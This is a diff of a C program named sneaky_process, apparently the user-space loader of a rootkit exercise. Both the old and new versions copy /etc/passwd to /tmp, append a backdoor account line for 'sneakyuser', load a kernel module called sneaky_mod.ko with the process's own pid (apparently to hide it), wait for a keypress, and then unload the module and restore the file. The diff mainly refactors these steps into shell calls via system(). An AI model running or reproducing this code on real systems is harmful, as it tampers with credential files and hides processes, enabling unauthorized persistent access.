@@ -1,77 +1,59 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <string.h>
 
-/*
- * duplicate_file: Copies the content of the source file to the destination file.
- * This function reads from src_path and writes the contents to dst_path.
- */
-void duplicate_file(const char *src_path, const char *dst_path)
-{
-    FILE *src = fopen(src_path, "r");
-    if (!src) {
-        perror("Error opening source file");
-        exit(EXIT_FAILURE);
-    }
-    FILE *dst = fopen(dst_path, "w");
-    if (!dst) {
-        perror("Error opening destination file");
-        fclose(src);
-        exit(EXIT_FAILURE);
-    }
-    int ch;
-    while ((ch = fgetc(src)) != EOF) {
-        fputc(ch, dst);
-    }
-    fclose(src);
-    fclose(dst);
-}
+#define PASSWD_PATH "/etc/passwd"
+#define TMP_PASSWD_PATH "/tmp/passwd"
 
-/*
- * append_entry: Appends a new line at the end of a file.
- * This function opens the file in append mode and writes the specified text to it.
- */
-void append_entry(const char *file_path, const char *entry)
-{
-    FILE *fp = fopen(file_path, "a");
-    if (!fp) {
-        perror("Error opening file for appending");
-        exit(EXIT_FAILURE);
-    }
-    fprintf(fp, "%s\n", entry);
-    fclose(fp);
-}
-
-int main()
-{
-    char cmd[256];
-
+void print_pid() {
     printf("sneaky_process pid = %d\n", getpid());
+}
 
-    // Backup /etc/passwd to /tmp/passwd
-    duplicate_file("/etc/passwd", "/tmp/passwd");
-
-    // Append a malicious entry to the end of /etc/passwd
-    append_entry("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-
-    // Load the kernel module and pass the sneaky_pid parameter
-    snprintf(cmd, sizeof(cmd), "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
+void copy_file(){
+    char cmd[100];
+    snprintf(cmd, sizeof(cmd), "cp %s %s", PASSWD_PATH, TMP_PASSWD_PATH);
     system(cmd);
+    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> " PASSWD_PATH);
+}
 
-    // Wait for the user to enter 'q' to quit (no need to press enter after 'q')
-    char ch;
-    while ((ch = getchar()) != 'q') {
-        /* Do nothing until 'q' is pressed */
+void load_sneaky_module(){
+    char cmd[100];
+    int pid = getpid();
+    snprintf(cmd, sizeof(cmd), "insmod sneaky_mod.ko sneaky_pid=%d", pid);
+    if (system(cmd) != 0) {
+        fprintf(stderr, "Failed to load module\n");
+        exit(1);
     }
+}
 
-    // Unload the kernel module
-    system("rmmod sneaky_mod");
+void read_input(){
+    int c;
+    while((c = getchar()) != EOF){
+        if(c == 'q'){
+            break;
+        }
+    }
+}
+void unload_sneaky_module() {
+    if (system("rmmod sneaky_mod") != 0) {
+        fprintf(stderr, "Failed to unload module\n");
+    }
+}
 
-    // Restore the original /etc/passwd file
-    duplicate_file("/tmp/passwd", "/etc/passwd");
-    // Remove the backup file
-    system("rm -f /tmp/passwd");
+void restore_file() {
+    char cmd[100];
+    snprintf(cmd, sizeof(cmd), "cp %s %s", TMP_PASSWD_PATH, PASSWD_PATH);
+    system(cmd);
+    snprintf(cmd, sizeof(cmd), "rm %s", TMP_PASSWD_PATH);
+    system(cmd);
+}
 
-    return EXIT_SUCCESS;
+int main(){
+    print_pid();
+    copy_file();
+    load_sneaky_module();
+    read_input();
+    unload_sneaky_module();
+    restore_file();
+    return 0;
 }
